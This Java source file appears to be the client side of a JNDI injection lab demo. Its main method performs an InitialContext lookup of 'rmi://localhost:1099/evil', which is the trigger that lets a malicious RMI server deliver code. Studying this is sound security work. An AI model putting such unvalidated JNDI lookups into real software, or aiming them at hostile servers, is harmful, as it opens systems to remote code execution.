package fun.gengzi.algorithm;

import javax.naming.Context;

import javax.naming.InitialContext;

import javax.naming.NamingException;


public class Client {

    public static void main(String[] args) throws NamingException {
        Context context = new InitialContext();
        context.lookup("rmi://localhost:1099/evil");
    }

}